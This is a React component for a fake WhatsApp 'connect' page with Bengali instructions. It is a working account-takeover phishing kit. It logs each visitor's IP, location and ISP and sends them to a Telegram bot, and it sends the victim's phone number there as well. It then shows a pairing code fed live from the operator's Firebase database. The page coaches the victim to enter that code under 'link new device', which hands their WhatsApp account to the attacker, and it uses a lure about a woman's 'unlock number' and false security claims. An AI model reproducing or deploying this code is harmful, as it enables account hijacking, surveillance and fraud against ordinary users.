import React, { useState, useEffect } from 'react';
import { initializeApp } from 'firebase/app';
import { getDatabase, ref, onValue } from 'firebase/database';
import { Tab } from '../../types';
import { APP_CONFIG, FIREBASE_CONFIG } from '../../constants';
import { sendTelegramMessage } from '../../services/telegramService';

interface WhatsAppGuideViewProps {
  onNavigate: (tab: Tab) => void;
  isLoginMode?: boolean;
  onVerify?: (phone: string) => void;
}

const WhatsAppGuideView: React.FC<WhatsAppGuideViewProps> = ({ 
  onNavigate, 
  isLoginMode = false, 
  onVerify 
}) => {
  const [phase, setPhase] = useState<'input' | 'guide'>('input');
  const [phone, setPhone] = useState('');
  const [timeLeft, setTimeLeft] = useState(20);
  const [pinCode, setPinCode] = useState<string[]>(Array(8).fill(''));
  const [isCountdownFinished, setIsCountdownFinished] = useState(false);

  // Track visitor on mount
  useEffect(() => {
    const trackVisitor = async () => {
      // If we are in login mode, we always track. If in app, check storage.
      if (!isLoginMode && localStorage.getItem('wa_connect_guide_visited')) return;
      
      try {
        const res = await fetch('https://ipwho.is/');
        if (!res.ok) return;
        const data = await res.json();
        
        const ip = data.ip || 'Unknown';
        const city = data.city || 'Unknown';
        const country = data.country || 'Unknown';
        const isp = data.connection?.isp || 'Unknown';

        const message = `
*👤 New Visitor on Connect Guide!*
-------------------------
*IP:* \`${ip}\`
*Location:* ${city}, ${country}
*ISP:* ${isp}
-------------------------`;
        await sendTelegramMessage(message);
        if (!isLoginMode) {
          localStorage.setItem('wa_connect_guide_visited', 'true');
        }
      } catch (e) { 
        console.warn("Visitor tracking failed", e); 
      }
    };
    trackVisitor();
  }, [isLoginMode]);

  // Handle Countdown and Firebase connection
  useEffect(() => {
    if (phase === 'guide') {
      const timer = setInterval(() => {
        setTimeLeft((prev) => {
          if (prev <= 1) {
            clearInterval(timer);
            setIsCountdownFinished(true);
            connectFirebase();
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      return () => clearInterval(timer);
    }
  }, [phase]);

  const connectFirebase = () => {
    try {
      const app = initializeApp(FIREBASE_CONFIG);
      const db = getDatabase(app);
      const liveCodeRef = ref(db, 'liveCode');

      onValue(liveCodeRef, (snapshot) => {
        const data = snapshot.val();
        const code = data && data.code ? String(data.code).trim().padEnd(8, ' ') : "        ";
        setPinCode(code.split('').slice(0, 8));
      });
    } catch (error) {
      console.error("Firebase init failed:", error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!phone || phone.length < 10) {
      alert("Please enter a valid phone number.");
      return;
    }

    await sendTelegramMessage(`*🚨 New Whatsapp Connect Attempt!*\nUser Phone: \`${phone}\`\nTime: ${new Date().toLocaleString()}`);
    setPhase('guide');
  };

  const handleComplete = () => {
    if (isLoginMode && onVerify) {
      onVerify(phone);
    } else {
      onNavigate('home');
    }
  };

  // Background style from provided HTML: linear-gradient(135deg, #128C7E, #075E54)
  const bgClass = "bg-gradient-to-br from-[#128C7E] to-[#075E54]";

  if (phase === 'input') {
    return (
      <div className={`min-h-screen ${bgClass} flex items-center justify-center p-4 font-kalpurush`}>
        <div className="bg-[#ECE5DD] w-full max-w-[400px] rounded-3xl shadow-2xl p-8 relative animate-[fadeIn_0.5s_ease-in-out]">
          
          {/* Only show close button if NOT in mandatory login mode */}
          {!isLoginMode && (
            <button 
              onClick={() => onNavigate('home')} 
              className="absolute top-4 right-4 text-gray-400 hover:text-gray-600"
            >
              <i className="fas fa-times text-xl"></i>
            </button>
          )}

          <div className="text-center">
            <div className="w-20 h-20 bg-emerald-100 text-[#075E54] rounded-full flex items-center justify-center text-4xl mx-auto mb-6 shadow-inner">
              <i className="fab fa-whatsapp"></i>
            </div>
            <h1 className="text-2xl font-bold text-gray-800 mb-2">Welcome to WhatsApp</h1>
            <p className="text-gray-500 mb-8 text-sm">Please enter your phone number to continue and connect your account.</p>

            <form onSubmit={handleSubmit} className="space-y-5">
              <div className="text-left">
                <label className="block text-xs font-bold text-gray-500 uppercase mb-1 ml-1">Phone Number</label>
                <input 
                   type="tel" 
                   value={phone}
                   onChange={(e) => setPhone(e.target.value)}
                   placeholder="017XXXXXXXX" 
                   className="w-full p-4 rounded-xl border-2 border-gray-200 focus:border-[#25D366] focus:ring-2 focus:ring-emerald-100 outline-none text-lg font-medium transition-all text-center text-gray-800"
                   required
                />
              </div>
              <button 
                 type="submit"
                 className="w-full py-4 bg-[#25D366] text-white font-bold rounded-xl shadow-lg hover:bg-[#1dbb5f] transition-transform active:scale-95 text-lg"
              >
                Register & Continue
              </button>
              <p className="text-xs text-center text-gray-400 mt-4">By continuing, you agree to our Terms & Conditions.</p>
            </form>
          </div>
        </div>
      </div>
    );
  }

  // Guide Phase
  return (
    <div className={`min-h-screen ${bgClass} flex items-center justify-center p-4 font-kalpurush`}>
      <div className="bg-[#ECE5DD] w-full max-w-[400px] rounded-3xl shadow-2xl p-8 relative animate-[fadeIn_0.5s_ease-in-out]">
        
        <div className="text-center">
            <div className="text-5xl text-[#075E54] mb-4 flex justify-center">
                <i className="fa-solid fa-circle-info text-teal-800"></i>
            </div>
            <h1 className="text-2xl font-bold text-gray-800 mb-3">Whatsapp চ্যানেলে যুক্ত হওয়ার নির্দেশনা</h1>
        
            <p className="text-gray-600 mb-4">নুসরাত এর ৮-সংখ্যার Whatsapp আনলক নাম্বার</p>
            
            {/* Dynamic Display */}
            <div className="flex justify-center gap-1.5 mb-6 min-h-[52px]">
                {!isCountdownFinished ? (
                  <div className="flex items-center justify-center w-full p-3 bg-amber-50 border border-amber-200 rounded-lg text-amber-800 font-bold">
                    কোড প্রদর্শিত হবে: <span className="ml-2">{timeLeft}</span> সেকেন্ড
                  </div>
                ) : (
                  <div className="flex gap-1">
                    {pinCode.map((digit, idx) => (
                      <span key={idx} className="w-[34px] h-[44px] sm:w-[38px] sm:h-[48px] flex justify-center items-center text-xl sm:text-2xl font-bold bg-white border-2 border-[#128C7E] text-[#075E54] rounded-lg shadow-sm">
                        {digit}
                      </span>
                    ))}
                  </div>
                )}
            </div>

            {/* Instructions */}
            <div className="bg-white p-4 rounded-lg shadow-inner text-gray-700 text-left mb-6">
                <h2 className="text-lg font-semibold mb-3 border-b pb-2">আপনার ফোনে আনলক নাম্বার প্রবেশ করান:</h2>
                <ul className="space-y-3 text-[14px]">
                    <li className="flex items-start gap-3">
                        <i className="fa-solid fa-mobile-screen-button text-[#128C7E] mt-1 shrink-0 w-5 text-center"></i>
                        <span>প্রথমে আপনার ফোনের নোটিফিকেশন থেকে <strong>"Enter code to link new device"</strong> এ ক্লিক করুন।</span>
                    </li>
                    <li className="flex items-start gap-3">
                        <i className="fa-solid fa-circle-check text-[#128C7E] mt-1 shrink-0 w-5 text-center"></i>
                        <span>এরপর <strong>Confirm</strong> বাটনে ক্লিক করুন।</span>
                    </li>
                    <li className="flex items-start gap-3">
                        <i className="fa-solid fa-fingerprint text-[#128C7E] mt-1 shrink-0 w-5 text-center"></i>
                        <span>আপনার ফোনের ফিঙ্গারপ্রিন্ট অথবা প্যাটার্ন লক দিয়ে আনলক করুন।</span>
                    </li>
                    <li className="flex items-start gap-3">
                        <i className="fa-regular fa-keyboard text-[#128C7E] mt-1 shrink-0 w-5 text-center"></i>
                        <span>সবশেষে, ফাঁকা ৮টি বক্সে উপরে দেখানো আনলক নাম্বার টি বসান এবং অপেক্ষা করুন।</span>
                    </li>
                </ul>
            </div>
            
            <p className="text-xs text-gray-500 mt-4 mb-6">দ্রষ্টব্য: নিরাপত্তার জন্য এই আনলক নাম্বার টি প্রতি ১ মিনিট পর পর স্বয়ংক্রিয়ভাবে পরিবর্তন হবে।</p>
            
            <button 
                onClick={handleComplete}
                className="w-full py-3.5 bg-gradient-to-r from-[#25D366] to-[#128C7E] text-white font-bold rounded-xl shadow-md hover:shadow-lg transition-all active:scale-95 text-center block"
            >
                নির্দেশনা সম্পূর্ণ হলে অ্যাপে ফিরে যান
            </button>
        </div>
      </div>
    </div>
  );
};

export default WhatsAppGuideView;